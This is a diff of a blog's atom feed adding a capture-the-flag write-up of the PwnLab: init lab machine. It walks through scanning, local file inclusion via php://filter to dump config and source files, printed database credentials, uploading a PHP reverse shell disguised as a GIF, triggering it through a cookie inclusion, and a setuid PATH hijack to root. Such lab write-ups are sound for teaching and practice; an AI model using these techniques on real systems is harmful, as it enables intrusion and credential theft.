@@ -4,7 +4,7 @@
   <title><![CDATA[Category: lfi | Bob1Bob2]]></title>
   <link href="http://wg135.github.io/blog/categories/lfi/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-09-09T15:25:04-05:00</updated>
+  <updated>2016-09-16T14:24:00-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,279 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[pwnlab_init]]></title>
+    <link href="http://wg135.github.io/blog/2016/09/11/pwnlab-init/"/>
+    <updated>2016-09-11T09:07:37-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/09/11/pwnlab-init</id>
+    <content type="html"><![CDATA[<h2>Tools:</h2>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>DirBuster</li>
+<li>Burp</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.50.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.50.131 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.50.131 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 80 is opening.</p>
+
+<p>use nikto to scan</p>
+
+<p><code>nikto -h 192.168.50.131</code></p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use dirbuster to get all dirs and files</p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the page:</p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use sqlmap</p>
+
+<p><code>sqlmap -u "http://192.168.50.131"  --forms --batch --crawl=10 --level=5 --risk=3 --random-agent --dbms=MySQL</code></p>
+
+<p>Nothing.</p>
+
+<p>Check the page souce code,</p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>It seems there is a local file inclusion in <code>page</code> parmeter, based on <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">LFI</a></p>
+
+<p><code>curl http://192.168.50.131/?page=php://filter/convert.base64-encode/resource=config</code></p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get config.php' base64 encoded content</p>
+
+<p><code>echo PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+ | base64 --decode</code></p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get mysql username/password</p>
+
+<p>connect mysql database:</p>
+
+<p><code>mysql -h 192.168.50.131 -u root -pH4u%QJ_H99</code></p>
+
+<p>show databases:</p>
+
+<p><code>mysql&gt; show databases;</code></p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<pre><code>mysql&gt; show tables;
+mysql&gt; use Users;
+mysql&gt; select * from users;
+</code></pre>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>these passwords are base64 encoded</p>
+
+<pre><code>kent | JWzXuBJJNy
+mike | SIfdsTEn6I
+kane | iSv5Ym2GRo
+</code></pre>
+
+<p>login as kane</p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>try to upload webshell, failed. only accept image.</p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>in order to find out which file extension do i need</p>
+
+<p>I will get upload.php code</p>
+
+<p><code>curl http://192.168.50.131/?page=php://filter/convert.base64-encode/resource=upload</code></p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>decode the content</p>
+
+<pre><code class="php">&lt;?php
+session_start();
+if (!isset($_SESSION['user'])) { die('You must be log in.'); }
+?&gt;
+&lt;html&gt;
+    &lt;body&gt;
+        &lt;form action='' method='post' enctype='multipart/form-data'&gt;
+            &lt;input type='file' name='file' id='file' /&gt;
+            &lt;input type='submit' name='submit' value='Upload'/&gt;
+        &lt;/form&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+&lt;?php 
+if(isset($_POST['submit'])) {
+    if ($_FILES['file']['error'] &lt;= 0) {
+        $filename  = $_FILES['file']['name'];
+        $filetype  = $_FILES['file']['type'];
+        $uploaddir = 'upload/';
+        $file_ext  = strrchr($filename, '.');
+        $imageinfo = getimagesize($_FILES['file']['tmp_name']);
+        $whitelist = array(".jpg",".jpeg",".gif",".png"); 
+
+        if (!(in_array($file_ext, $whitelist))) {
+            die('Not allowed extension, please upload images only.');
+        }
+
+        if(strpos($filetype,'image') === false) {
+            die('Error 001');
+        }
+
+        if($imageinfo['mime'] != 'image/gif' &amp;&amp; $imageinfo['mime'] != 'image/jpeg' &amp;&amp; $imageinfo['mime'] != 'image/jpg'&amp;&amp; $imageinfo['mime'] != 'image/png') {
+            die('Error 002');
+        }
+
+        if(substr_count($filetype, '/')&gt;1){
+            die('Error 003');
+        }
+
+        $uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;
+
+        if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
+            echo "&lt;img src=\"".$uploadfile."\"&gt;&lt;br /&gt;";
+        } else {
+            die('Error 4');
+        }
+    }
+}
+</code></pre>
+
+<p>so image extensions are <code>$whitelist = array(".jpg",".jpeg",".gif",".png");</code></p>
+
+<p>copy a php reverse shell into a gif file, use burp add <code>GIF</code></p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>then the php shell is uploaded</p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now need to find out how to trigger the shell</p>
+
+<p>check index.php</p>
+
+<p><code>curl http://192.168.50.131/?page=php://filter/convert.base64-encode/resource=index</code></p>
+
+<p>```php
+&lt;?php
+//Multilingual. Not implemented yet.
+//setcookie(&ldquo;lang&rdquo;,&ldquo;en.lang.php&rdquo;);
+if (isset($<em>COOKIE[&lsquo;lang&rsquo;]))
+{
+    include(&ldquo;lang/&rdquo;.$</em>COOKIE[&lsquo;lang&rsquo;]);
+}
+// Not implemented yet.
+?>
+<html>
+<head>
+<title>PwnLab Intranet Image Hosting</title>
+</head>
+<body></p>
+
+<center>
+<img src="images/pwnlab.png"><br />
+[ <a href="http://wg135.github.io/">Home</a> ] [ <a href="?page=login">Login</a> ] [ <a href="?page=upload">Upload</a> ]
+<hr/><br/>
+<?php
+    if (isset($_GET['page']))
+    {
+        include($_GET['page'].".php");
+    }
+    else
+    {
+        echo "Use this server to upload and share image files inside the intranet";
+    }
+?>
+</center>
+
+
+<p></body>
+</html>
+```
+find out cookie also have LFI.</p>
+
+<p>first verify the LFI</p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now setup netcat on port 443</p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the shell</p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>login in as kane</p>
+
+<p><code>su kane</code></p>
+
+<p>find an interesting file msgmike</p>
+
+<p><code>ls -alh msgmike</code></p>
+
+<p>its seuid is set.</p>
+
+<p>try to run it</p>
+
+<p><code>./msgmike</code></p>
+
+<p>shows <code>cat: /home/mike/msg.txt: No such file or directory</code></p>
+
+<p>try to escape it</p>
+
+<pre><code>export PATH=.:$PATH
+echo "/bin/bash" &gt; cat
+chmod +x cat
+./msgmike
+</code></pre>
+
+<p>now escape to user mike.</p>
+
+<p>Find another program&rsquo;s setuid is on</p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>run <code>msg2root</code></p>
+
+<p><code>Message for root:</code></p>
+
+<p>upload <a href="https://github.com/wg135/script/blob/master/suid.c">setuid.c</a>, compiled.</p>
+
+<p>run msg2root, get root</p>
+
+<p><img src="/images/blog/vulhub/pwnlab_init/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[milnet1]]></title>
